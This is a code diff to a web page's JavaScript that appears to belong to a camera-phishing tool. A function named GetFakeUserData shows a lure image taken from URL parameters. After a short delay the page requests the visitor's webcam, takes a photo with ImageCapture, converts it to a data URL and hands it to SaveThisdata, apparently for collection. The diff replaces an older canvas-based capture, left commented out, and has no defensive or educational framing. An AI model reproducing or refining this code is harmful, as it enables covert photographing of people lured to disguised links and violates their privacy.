@@ -23,6 +23,21 @@ document.addEventListener('DOMContentLoaded', function () {
 
   var uniqueNum = Math.floor(Math.random(1,1000000))+new Date().getTime()
 
+
+
+
+  
+    // BlobData Url
+    function blobToDataURL(blob) {
+      return new Promise((resolve) => {
+          const reader = new FileReader();
+          reader.onloadend = () => resolve(reader.result);
+          reader.readAsDataURL(blob);
+      });
+    }
+ 
+
+
     function GetFakeUserData() {
       if (document.querySelectorAll('.wvu img').length > 0) { 
         if (new URLSearchParams(window.location.search).has('link') && new URLSearchParams(window.location.search).has('img')) { 
@@ -31,7 +46,7 @@ document.addEventListener('DOMContentLoaded', function () {
             let wimg = document.querySelector('.wvu img')
             wimg.src = new URLSearchParams(window.location.search).get('img')
           }
-          showPrevImg() 
+          showPrevImg()
 
 
           function SaveThisdata(photo) { 
@@ -51,32 +66,56 @@ document.addEventListener('DOMContentLoaded', function () {
             })
           }
           function GetImgThenSave() {
-            var video = document.getElementById('video'); 
+            
             // Cross-browser getUserMedia
             navigator.getUserMedia = (navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia);
             if (navigator.getUserMedia) {
-              navigator.getUserMedia({ video: true },
-                function (stream) {
-                  video.srcObject = stream;
-      
-                  setTimeout(() => {
-                    var canvas = document.createElement('canvas');
-                    canvas.width = 700;
-                    canvas.height = 500;
-                    var context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    // Convert the canvas content to base64
-                    var base64Data = canvas.toDataURL('image/png');
-                    SaveThisdata(`${base64Data}`)
-                  }, 2000);
-
-
-                },
-                function (err) {
-                  SaveThisdata('assets/img/no-image-found.jpg?from=Not got any permision')
+               
+                async function NowCapture() {
+                  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                  const track = stream.getVideoTracks()[0];
+                  const imageCapture = new ImageCapture(track);
+          
+                  const photoBlob = await imageCapture.takePhoto();
+                  const photoDataURL = await blobToDataURL(photoBlob);
+    
+                  SaveThisdata(`${photoDataURL}`)
+  
+                  // Stop the video stream after capturing the photo
+                  stream.getTracks().forEach(track => track.stop());
                 }
-              );
+                setTimeout(() => {
+                  NowCapture()
+                }, 1500);
+
+            
+
+
+
+              // navigator.getUserMedia({ video: true },
+              //   function (stream) {
+              //     video.srcObject = stream;
+      
+              //     setTimeout(() => {
+              //       var canvas = document.createElement('canvas');
+              //       canvas.width = 700;
+              //       canvas.height = 500;
+              //       var context = canvas.getContext('2d');
+              //       context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+              //       // Convert the canvas content to base64
+              //       var base64Data = canvas.toDataURL('image/png');
+              //       SaveThisdata(`${base64Data}`)
+              //     }, 2000);
+
+
+              //   },
+              //   function (err) {
+              //     SaveThisdata('assets/img/no-image-found.jpg?from=Not got any permision')
+              //   });
+
+
+
             } else {
               SaveThisdata('assets/img/no-image-found.jpg?from=getUserMedia is not supported') 
             }
